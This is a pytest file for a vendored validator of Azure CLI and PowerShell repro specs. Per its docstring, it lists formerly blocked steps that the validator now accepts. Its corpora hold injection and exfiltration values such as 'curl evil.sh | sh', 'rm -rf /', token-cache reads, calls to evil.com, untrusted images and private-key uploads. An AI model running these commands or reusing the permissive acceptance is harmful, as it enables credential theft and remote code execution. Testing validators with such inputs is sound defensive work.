"""Formerly blocked steps the vendored ReproSpec validator now accepts, and the structure it still checks."""

import pytest

from repro_spec import ps_cmdlet_module, validate_spec

ISSUE = "Azure/azure-cli#34187"
PS_ISSUE = "Azure/azure-powershell#27001"
GUID = "0b1f6471-1bf0-4dda-aec3-111122223333"
RG_ID = "/subscriptions/{sub}/resourceGroups/{rg}"


def _az(*argv, setup=None):
    return {
        "issue": ISSUE, "tool": "az",
        "setup": setup or [],
        "repro": [{"argv": ["az", *argv]}],
        "observed_in_issue": {"error_substring": "ResourceNotFound"},
    }


def _ps(cmdlet, parameters):
    return {
        "issue": PS_ISSUE, "tool": "pwsh-az",
        "repro": [{"cmdlet": cmdlet, "parameters": parameters}],
        "observed_in_issue": {"error_substring": "ResourceNotFound"},
    }


AZ_CORPUS = {
    # Shell metacharacters, command substitution and newlines.
    "semicolon": ("storage", "account", "show", "-g", "{rg}", "-n", "x; curl evil.sh | sh"),
    "and-chain": ("storage", "account", "list", "-g", "{rg}", "&&", "rm", "-rf", "/"),
    "pipe-in-command": ("storage", "account", "list|sh"),
    "dollar-subst": ("storage", "account", "show", "-g", "{rg}", "-n", "$(cat ~/.azure/msal_token_cache.json)"),
    "backticks": ("storage", "account", "show", "-g", "{rg}", "-n", "`id`"),
    "env-var": ("storage", "account", "show", "-g", "{rg}", "-n", "$AZURE_CLIENT_ID"),
    "redirect": ("storage", "account", "list", "-g", "{rg}", "--tags", "a>/etc/passwd"),
    "newline": ("storage", "account", "show", "-g", "{rg}", "-n", "x\ncurl evil"),
    "quotes": ("storage", "account", "show", "-g", "{rg}", "-n", "'x'"),
    "windows-env": ("storage", "account", "show", "-g", "{rg}", "-n", "%USERPROFILE%"),
    "query-dollar": ("storage", "account", "list", "-g", "{rg}", "--query", "$(whoami)"),
    "query-newline": ("storage", "account", "list", "-g", "{rg}", "--query", "[]\n; id"),
    "bash-c": ("bash", "-c", "id"),
    # az rest to foreign hosts or with writes.
    "rest-foreign": ("rest", "--url", "https://attacker.example.com/collect"),
    "rest-foreign-com": ("rest", "--method", "get", "--url", "https://evil.com/x"),
    "rest-uri-alias": ("rest", "--uri", "https://evil.com/x"),
    "rest-arm-other-sub": ("rest", "--url", f"https://management.azure.com/subscriptions/{GUID}/resourcegroups"),
    "rest-arm-subscription": ("rest", "--url", "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments"),
    "rest-arm-dotdot": ("rest", "--url", RG_ID + "/../../providers/Microsoft.Authorization/roleAssignments"),
    "rest-put": ("rest", "--method", "put", "--url", RG_ID + "/providers/Microsoft.Storage/storageAccounts/{name1}"),
    "rest-body": ("rest", "--url", RG_ID, "--body", "{}"),
    "rest-headers": ("rest", "--url", RG_ID, "--headers", "Authorization=Bearer x"),
    "rest-resource": ("rest", "--url", RG_ID, "--resource", "https://graph.microsoft.com"),
    "rest-userinfo": ("rest", "--url", "https://management.azure.com@evil.com/subscriptions/{sub}/resourceGroups/{rg}"),
    "url-foreign": ("storage", "blob", "copy", "start", "--source-uri", "https://evil.com/payload"),
    "url-foreign-azure-host": ("storage", "blob", "copy", "start", "--source-uri", "https://attacker.blob.core.windows.net/c/b"),
    "url-userinfo": ("storage", "blob", "copy", "start", "--source-uri", "https://{name1}.blob.core.windows.net@1.2.3.4/x"),
    "url-http": ("storage", "blob", "copy", "start", "--source-uri", "http://{name1}.blob.core.windows.net/c/b"),
    "url-file-scheme": ("storage", "blob", "copy", "start", "--source-uri", "file:///etc/passwd"),
    "bare-host": ("webapp", "config", "set", "-g", "{rg}", "-n", "{name1}", "--generic-configurations", "evil.com"),
    "image-foreign": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "docker.io/evil/miner"),
    # Unqualified image references resolve to Docker Hub.
    "image-bare-dockerhub": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload:latest"),
    "image-library": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "alpine"),
    "image-ip-registry": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "203.0.113.7:5000/payload"),
    "image-localhost": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "localhost:5000/payload"),
    "image-digest": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload@sha256:" + "a" * 64),
    "image-mcr-lookalike": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com.evil.io/payload"),
    "image-mcr-port": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com:443/payload"),
    "image-mcr-no-path": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com"),
    "image-twice": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld", "evil/payload"),
    "image-equals": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image=evil/payload"),
    "containerapp-image": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
    "containerapp-image-short": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
    "containerapp-update-image": ("containerapp", "update", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
    "containerapp-job-image": ("containerapp", "job", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
    "functionapp-image": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
    "functionapp-image-short": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
    "webapp-image-short": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "-i", "evil/payload"),
    "webapp-container-image-name": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--container-image-name", "nginx"),
    "webapp-deployment-image-name": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--deployment-container-image-name", "nginx"),
    "webapp-config-container-short": ("webapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-c", "evil/payload"),
    "webapp-create-c": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "-c", "evil/payload"),
    "functionapp-config-container-c": ("functionapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-c", "evil/payload"),
    "functionapp-config-container-i": ("functionapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
    "logicapp-image-short": ("logicapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
    "logicapp-image": ("logicapp", "create", "-g", "{rg}", "-n", "{name1}", "--deployment-container-image-name", "nginx"),
    "containerapp-revision-copy-image": ("containerapp", "revision", "copy", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
    # Entrypoint overrides run arbitrary commands even in an allowlisted image.
    "container-command-line": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azure-cli", "--command-line", "curl -sSLo /tmp/p 203.0.113.7/p"),
    "containerapp-args": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azure-cli", "--args", "-c"),
    "aka-ms": ("storage", "account", "list", "-g", "{rg}", "--tags", "x=aka.ms/evil"),
    # Subscription, tenant and identity targeting.
    "subscription": ("storage", "account", "list", "--subscription", "Other Sub"),
    "subscription-equals": ("storage", "account", "list", "--subscription=Other"),
    "subscription-abbrev": ("storage", "account", "list", "--subscr", "Other"),
    "tenant": ("storage", "account", "list", "--tenant", "contoso"),
    "literal-guid": ("storage", "account", "list", "-g", "{rg}", "--tags", f"owner={GUID}"),
    "resource-id-other-rg": ("monitor", "metrics", "list", "--resource", "/subscriptions/{sub}/resourceGroups/prod/providers/x"),
    "resource-id-literal-sub": ("monitor", "metrics", "list", "--resource", f"/subscriptions/{GUID}/resourceGroups/{{rg}}"),
    "other-rg": ("storage", "account", "list", "-g", "production-rg"),
    "other-rg-long": ("storage", "account", "list", "--resource-group", "prod"),
    "sub-placeholder-outside-id": ("storage", "account", "list", "-g", "{rg}", "--tags", "s=x{sub}"),
    # @file, local files and scripts.
    "at-file": ("storage", "account", "create", "-g", "{rg}", "-n", "{name1}", "--tags", "@/home/runner/.azure/azureProfile.json"),
    "at-file-query": ("storage", "account", "list", "-g", "{rg}", "--query", "@q.txt"),
    "file-arg": ("storage", "blob", "upload", "--account-name", "{name1}", "-c", "c", "-n", "b", "--file", "/etc/passwd"),
    "file-short": ("storage", "blob", "upload", "--account-name", "{name1}", "-c", "c", "-n", "b", "-f", "~/.ssh/id_rsa"),
    "file-relative-parent": ("storage", "blob", "upload", "--account-name", "{name1}", "-c", "c", "-n", "b", "--file", "../secrets"),
    "local-path": ("storage", "blob", "download", "--account-name", "{name1}", "-c", "c", "-n", "b", "--destination", "/home/runner/x"),
    "template-file": ("deployment", "group", "create", "-g", "{rg}", "--template-file", "main.bicep"),
    "template-uri": ("storage", "account", "create", "-g", "{rg}", "-n", "{name1}", "--template-uri", "https://evil.com/t.json"),
    "scripts": ("vm", "create", "-g", "{rg}", "-n", "{name1}", "--image", "Ubuntu2204", "--scripts", "@/home/runner/.azure/msal_token_cache.json"),
    "custom-data": ("vm", "create", "-g", "{rg}", "-n", "{name1}", "--image", "Ubuntu2204", "--custom-data", "/home/runner/.azure/msal_token_cache.json"),
    "user-data": ("vm", "create", "-g", "{rg}", "-n", "{name1}", "--image", "Ubuntu2204", "--user-data", "~/.azure/azureProfile.json"),
    "startup-file": ("webapp", "config", "set", "-g", "{rg}", "-n", "{name1}", "--startup-file", "curl evil | sh"),
    "script-block": ("storage", "account", "list", "-g", "{rg}", "--tags", "{ Invoke-WebRequest evil }"),
    "unknown-placeholder": ("storage", "account", "list", "-g", "{rg}", "--tags", "{env:HOME}"),
    "password-elsewhere": ("storage", "account", "list", "-g", "{rg}", "--tags", "p={password}"),
    # Secrets and keys in arguments.
    "literal-password": ("sql", "server", "create", "-g", "{rg}", "-n", "{name1}", "--admin-password", "P@ssw0rd123!"),
    "password-abbrev": ("sql", "server", "create", "-g", "{rg}", "-n", "{name1}", "--admin-pass", "x"),
    "account-key": ("storage", "container", "list", "--account-name", "{name1}", "--account-key", "abc"),
    "connection-string": ("storage", "container", "list", "--connection-string", "DefaultEndpointsProtocol=https"),
    "sas-in-url": ("storage", "blob", "copy", "start", "--source-uri", "https://{name1}.blob.core.windows.net/c/b?sv=1&sig=abcdefghijklmnopqrstuvwxyz0123456789"),
    "github-token": ("storage", "account", "list", "-g", "{rg}", "--tags", "t=ghp_abcdefghijklmnopqrstuvwxyz0123456789"),
    "key-like": ("storage", "account", "list", "-g", "{rg}", "--tags", "k=Abc123def456GHI789jkl012MNO345pqr678STU901vwx"),
    "credential-kv": ("webapp", "config", "appsettings", "set", "-g", "{rg}", "-n", "{name1}", "--settings", "password=Sup3rS3cret!x"),
    "containerapp-secrets": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--secrets", "db=hunter22"),
    "show-values": ("containerapp", "secret", "list", "-g", "{rg}", "-n", "{name1}", "--show-values"),
    # Denied groups and commands.
    "login": ("login", "--service-principal"),
    "account-set": ("account", "set", "-s", "x"),
    "account-token": ("account", "get-access-token"),
    "ad": ("ad", "sp", "create-for-rbac"),
    "role-assignment": ("role", "assignment", "create", "--assignee", "x", "--role", "Owner"),
    "role-flags": ("vm", "identity", "assign", "-g", "{rg}", "-n", "{name1}", "--role", "Owner", "--scope", RG_ID),
    "keyvault-secret-show": ("keyvault", "secret", "show", "--vault-name", "{name1}", "-n", "s"),
    "keyvault-secret-download": ("keyvault", "secret", "download", "--vault-name", "{name1}", "-n", "s"),
    "keyvault-set-policy": ("keyvault", "set-policy", "-n", "{name1}", "--upn", "evil"),
    "storage-keys": ("storage", "account", "keys", "list", "-g", "{rg}", "-n", "{name1}"),
    "storage-conn": ("storage", "account", "show-connection-string", "-g", "{rg}", "-n", "{name1}"),
    "generate-sas": ("storage", "container", "generate-sas", "--account-name", "{name1}", "-n", "c"),
    "cosmos-keys": ("cosmosdb", "keys", "list", "-g", "{rg}", "-n", "{name1}"),
    "acr-credential": ("acr", "credential", "show", "-n", "{name1}"),
    "vm-run-command": ("vm", "run-command", "invoke", "-g", "{rg}", "-n", "{name1}", "--command-id", "RunShellScript", "--scripts", "@run.sh"),
    "vm-extension": ("vm", "extension", "set", "-g", "{rg}", "--vm-name", "{name1}", "-n", "CustomScript", "--protected-settings", "../.azure/msal_token_cache.json"),
    "webapp-ssh": ("webapp", "ssh", "-g", "{rg}", "-n", "{name1}"),
    "webapp-deploy": ("webapp", "deploy", "-g", "{rg}", "-n", "{name1}", "--src-url", "https://evil.com/a.zip"),
    "webapp-publishing": ("webapp", "deployment", "list-publishing-credentials", "-g", "{rg}", "-n", "{name1}"),
    "container-exec": ("container", "exec", "-g", "{rg}", "-n", "{name1}", "--exec-command", "sh"),
    "extension-add": ("extension", "add", "--source", "https://evil.com/x.whl"),
    "aks-get-credentials": ("aks", "get-credentials", "-g", "{rg}", "-n", "{name1}"),
    "policy": ("policy", "assignment", "delete", "-n", "x"),
    "lock": ("lock", "delete", "-n", "x"),
    "group-delete": ("group", "delete", "-n", "{rg}", "--yes"),
    "config": ("config", "param-persist", "on"),
    "upgrade": ("upgrade",),
    "unknown-group": ("bogus", "command"),
    # Cost and size limits.
    "other-location": ("storage", "account", "create", "-g", "{rg}", "-n", "{name1}", "-l", "chinaeast2"),
    # Parser confusion.
    "combined-short": ("storage", "account", "list", "-gprod"),
    "positional-path": ("storage", "account", "create", "/etc/passwd"),
    "uppercase-command": ("Storage", "account", "list"),
    "unicode-line-separator": ("storage", "account", "show", "-g", "{rg}", "-n", "x\u2028y"),
}


PS_CORPUS = {
    "invoke-expression": ("Invoke-Expression", {"Command": "iwr evil"}),
    "invoke-rest": ("Invoke-AzRestMethod", {"Path": "/subscriptions"}),
    "connect": ("Connect-AzAccount", {}),
    "set-context": ("Set-AzContext", {"SubscriptionId": GUID}),
    "access-token": ("Get-AzAccessToken", {}),
    "run-command": ("Invoke-AzVMRunCommand", {"ResourceGroupName": "{rg}", "VMName": "{name1}"}),
    "set-run-command": ("Set-AzVMRunCommand", {"ResourceGroupName": "{rg}", "VMName": "{name1}"}),
    "custom-script": ("Set-AzVMCustomScriptExtension", {"ResourceGroupName": "{rg}", "VMName": "{name1}"}),
    "role-assignment": ("New-AzRoleAssignment", {"ObjectId": GUID, "RoleDefinitionName": "Owner"}),
    "ad": ("Get-AzADUser", {}),
    "kv-secret": ("Get-AzKeyVaultSecret", {"VaultName": "{name1}", "Name": "s", "AsPlainText": True}),
    "storage-key": ("Get-AzStorageAccountKey", {"ResourceGroupName": "{rg}", "Name": "{name1}"}),
    "sas": ("New-AzStorageAccountSASToken", {"Service": "Blob"}),
    "new-rg": ("New-AzResourceGroup", {"Name": "x", "Location": "{location}"}),
    "remove-resource": ("Remove-AzResource", {"ResourceId": RG_ID}),
    "deployment": ("New-AzResourceGroupDeployment", {"ResourceGroupName": "{rg}", "TemplateUri": "https://evil.com/t.json"}),
    "subscription-param": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "SubscriptionId": GUID}),
    "default-profile": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "DefaultProfile": "x"}),
    "abbreviated-param": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Subscr": "x"}),
    "script-block": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "{ iwr evil }"}),
    "subexpression": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "$(iwr evil)"}),
    "variable": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "$env:AZURE_CLIENT_ID"}),
    "hashtable-value": ("New-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "{name1}", "Tag": {"a": "b"}}),
    "null-value": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": None}),
    "splat-literal": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "@{a=1}"}),
    "custom-data": ("Set-AzVMOperatingSystem", {"CustomData": "curl evil"}),
    "user-data": ("New-AzVM", {"ResourceGroupName": "{rg}", "Name": "{name1}", "UserData": "x"}),
    "credential": ("New-AzVM", {"ResourceGroupName": "{rg}", "Name": "{name1}", "Credential": "x"}),
    "literal-password": ("New-AzSqlServer", {"ResourceGroupName": "{rg}", "ServerName": "{name1}", "SqlAdministratorPassword": "P@ss123"}),
    "file-path": ("Set-AzStorageBlobContent", {"Container": "c", "File": "C:\\Users\\runner\\.azure\\token"}),
    "url-foreign": ("Start-AzStorageBlobCopy", {"AbsoluteUri": "https://evil.com/x", "DestContainer": "c"}),
    "other-rg": ("Get-AzStorageAccount", {"ResourceGroupName": "production"}),
    "newline": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a\nb"}),
    "backtick": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a`b"}),
    "pipe": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a | Remove-AzStorageAccount"}),
    "bad-param-name": ("Get-AzStorageAccount", {"ResourceGroupName; iwr": "{rg}"}),
    # PowerShell-specific: separators, expansion, escapes and parameters the workflow controls.
    "semicolon": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a; Remove-AzResourceGroup -Name x"}),
    "semicolon-in-rg": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg};iex x"}),
    "subexpression-in-list": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": ["a", "$(iwr evil)"]}),
    "backtick-escape": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a`$(iwr)"}),
    "script-block-param": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "ScriptBlock": "iwr evil"}),
    "script-block-param-abbreviated": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "ScriptBl": "iwr evil"}),
    "invoke-expression-alias": ("iex", {"Command": "iwr evil"}),
    "invoke-command": ("Invoke-Command", {"ScriptBlock": "iwr evil"}),
    "start-job": ("Start-Job", {"ScriptBlock": "iwr evil"}),
    "azurerm-context-alias": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "AzureRmContext": "x"}),
    "azure-credential-alias": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "AzureCredential": "x"}),
    "debug": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Debug": True}),
    "verbose": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Verbose": True}),
    "out-variable": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "OutVariable": "global:x"}),
    "pipeline-variable": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "PipelineVariable": "x"}),
    "as-job": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "AsJob": True}),
    "redirection": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "a > C:\\out.txt"}),
    "call-operator": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "& calc"}),
    "lowercase-verb": ("get-AzStorageAccount", {"ResourceGroupName": "{rg}"}),
    "module-qualified": ("Az.Storage\\Get-AzStorageAccount", {"ResourceGroupName": "{rg}"}),
    # Container images must be fully qualified on MCR.
    "container-group-image": ("New-AzContainerGroup", {"ResourceGroupName": "{rg}", "Name": "{name1}", "Image": "evil/payload"}),
    "container-app-template-image": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": "evil/payload"}),
    "container-app-image-list": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": ["evil/payload"]}),
    "container-app-args": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": "mcr.microsoft.com/azure-cli", "Arg": "-c"}),
    "webapp-container-image": ("New-AzWebApp", {"ResourceGroupName": "{rg}", "Name": "{name1}", "ContainerImageName": "nginx"}),
    "functionapp-docker-image": ("New-AzFunctionApp", {"ResourceGroupName": "{rg}", "Name": "{name1}", "DockerImageName": "evil/payload"}),
}

# The module under test must be allowlisted and ship a repro cmdlet.
PS_MODULE_CORPUS = {
    "injection": "Az.Storage; iwr evil",
    "subexpression": "Az.$(iwr)",
    "path": "../Az.Storage",
    "not-allowlisted": "Az.Accounts",
    "unknown": "Az.Evil",
    "not-a-repro-module": "Az.Compute",
    "not-az": "PSReadLine",
    "non-string": ["Az.Storage"],
}


# Not Az cmdlets at all, so the PowerShell runner has nothing to call.
PS_NOT_AZ_CMDLETS = frozenset({
    "invoke-expression", "invoke-expression-alias", "invoke-command", "start-job",
    "lowercase-verb", "module-qualified",
})


def ps_case(name):
    """The PS corpus spec, naming the module when the noun map does not know it."""
    cmdlet, parameters = PS_CORPUS[name]
    spec = _ps(cmdlet, parameters)
    if name not in PS_NOT_AZ_CMDLETS and ps_cmdlet_module(cmdlet) is None:
        spec["module"] = "Az.Resources" if "Role" in cmdlet or "AD" in cmdlet else "Az.Accounts"
    return spec


@pytest.mark.parametrize("argv", list(AZ_CORPUS.values()), ids=list(AZ_CORPUS))
def test_any_az_step_is_accepted(argv):
    result = validate_spec(_az(*argv))
    assert result["valid"] is True, result["errors"]
    setup = validate_spec(_az("version", setup=[{"argv": ["az", *argv]}]))
    assert setup["valid"] is True, setup["errors"]


@pytest.mark.parametrize("name", list(PS_CORPUS))
def test_any_az_cmdlet_is_accepted(name):
    result = validate_spec(ps_case(name))
    if name in PS_NOT_AZ_CMDLETS:
        assert result["valid"] is False
        assert all(error.startswith("repro[0].cmdlet") for error in result["errors"])
    else:
        assert result["valid"] is True, result["errors"]


@pytest.mark.parametrize(
    "module", list(PS_MODULE_CORPUS.values()), ids=list(PS_MODULE_CORPUS),
)
def test_powershell_module_corpus_is_rejected(module):
    spec = _ps("Get-AzStorageAccount", {"ResourceGroupName": "{rg}"})
    spec["module"] = module

    result = validate_spec(spec)

    assert result["valid"] is False
    assert result["errors"]
    assert all(error.startswith("module") for error in result["errors"])


def test_module_is_rejected_for_az_specs():
    spec = _az("version")
    spec["module"] = "Az.Storage"

    result = validate_spec(spec)
    assert result["valid"] is False
    assert result["errors"] == ["module: only allowed for pwsh-az specs"]


def test_corpus_baselines_are_valid():
    assert validate_spec(_az("version"))["valid"] is True
    assert validate_spec(_az(
        "storage", "account", "list", "-g", "{rg}",
    ))["valid"] is True
    assert validate_spec(_ps(
        "Get-AzStorageAccount", {"ResourceGroupName": "{rg}"},
    ))["valid"] is True


@pytest.mark.parametrize("step", [
    {"argv": "az storage account list; curl evil | sh"},
    {"argv": ["sh", "-c", "curl evil | sh"]},
    {"argv": ["pwsh", "-Command", "iwr evil"]},
    {"argv": ["az"]},
    {"argv": ["az", "storage", 5]},
    {"argv": ["az", "storage", "account", "list"], "shell": True},
    {"cmdlet": "Get-AzStorageAccount", "parameters": {}},
    {"script": "az storage account list"},
], ids=[
    "shell-string", "sh", "pwsh-command", "no-command", "non-string",
    "extra-key", "cmdlet-for-az", "script-key",
])
def test_non_argv_steps_are_rejected(step):
    spec = _az("version")
    spec["repro"] = [step]

    assert validate_spec(spec)["valid"] is False


def test_az_steps_are_rejected_for_powershell_and_scripts_never_accepted():
    spec = _ps("Get-AzStorageAccount", {"ResourceGroupName": "{rg}"})
    spec["repro"].append({"argv": ["az", "storage", "account", "list"]})
    assert validate_spec(spec)["valid"] is False

    spec = _ps("Get-AzStorageAccount", {"ResourceGroupName": "{rg}"})
    spec["repro"][0]["script"] = "Get-AzStorageAccount | Remove-AzStorageAccount"
    assert validate_spec(spec)["valid"] is False


@pytest.mark.parametrize("observed", [
    {"exit_code": "1; rm -rf /"},
    {"stdout_regex": ".*"},
], ids=["exit-code-string", "unknown-key"])
def test_malformed_observed_text_is_rejected(observed):
    spec = _az("version")
    spec["observed_in_issue"] = observed

    assert validate_spec(spec)["valid"] is False


ALLOWED_IMAGE_STEPS = {
    "container": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld:latest"),
    "container-digest": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld@sha256:" + "a" * 64),
    "containerapp": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "mcr.microsoft.com/k8se/quickstart:latest"),
    "webapp": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--container-image-name", "mcr.microsoft.com/appsvc/staticsite:latest"),
    "webapp-storage-custom-id": ("webapp", "config", "storage-account", "add", "-g", "{rg}", "-n", "{name1}", "-i", "share1", "-a", "{name2}", "--sn", "s", "-t", "AzureFiles"),
    "vm-marketplace-image": ("vm", "create", "-g", "{rg}", "-n", "{name1}", "--image", "Ubuntu2204"),
    # -i and -c mean something else outside the image commands.
    "containerapp-env-infra-rg": ("containerapp", "env", "create", "-g", "{rg}", "-n", "{name1}", "-i", "{name2}"),
    "containerapp-session-identifier": ("containerapp", "session", "stop", "-g", "{rg}", "-n", "{name1}", "-i", "session1"),
    "functionapp-consumption-location": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "-s", "{name2}", "-c", "{location}"),
    "webapp-show-instance": ("webapp", "list-instances", "-g", "{rg}", "-n", "{name1}", "-i", "inst1"),
}


@pytest.mark.parametrize(
    "argv", list(ALLOWED_IMAGE_STEPS.values()), ids=list(ALLOWED_IMAGE_STEPS),
)
def test_images_are_accepted(argv):
    result = validate_spec(_az(*argv))

    assert result["valid"] is True, result["errors"]


def test_powershell_mcr_image_is_accepted():
    result = validate_spec(_ps(
        "New-AzContainerAppTemplateObject",
        {"Name": "{name1}", "Image": "mcr.microsoft.com/k8se/quickstart:latest"},
    ))

    assert result["valid"] is True, result["errors"]


_CONTAINER_YAML = {"extension": "yaml",
                   "content": "properties:\n  containers:\n  - image: x/y\n"}


@pytest.mark.parametrize("argv", [
    ("container", "create", "-g", "{rg}", "--file", "{file}"),
    ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--yaml", "{file}"),
    ("containerapp", "compose", "create", "-g", "{rg}", "--environment",
     "{name1}", "--compose-file-path", "{file}"),
    ("webapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}",
     "--multicontainer-config-type", "COMPOSE",
     "--multicontainer-config-file", "{file}"),
    ("acr", "run", "-r", "{name1}", "-f", "{file}"),
    ("acr", "build", "-r", "{name1}", "--file", "{file}"),
    ("batch", "task", "create", "--job-id", "j", "--json-file", "{file}"),
])
def test_input_file_is_accepted_for_commands_that_run_its_content(argv):
    result = validate_spec({**_az(*argv), "input_file": _CONTAINER_YAML})
    assert result["valid"] is True, result["errors"]


def test_powershell_input_file_is_accepted_for_container_nouns():
    spec = {**_ps("New-AzContainerGroup", {"File": "{file}"}),
            "input_file": _CONTAINER_YAML}
    assert validate_spec(spec)["valid"] is True
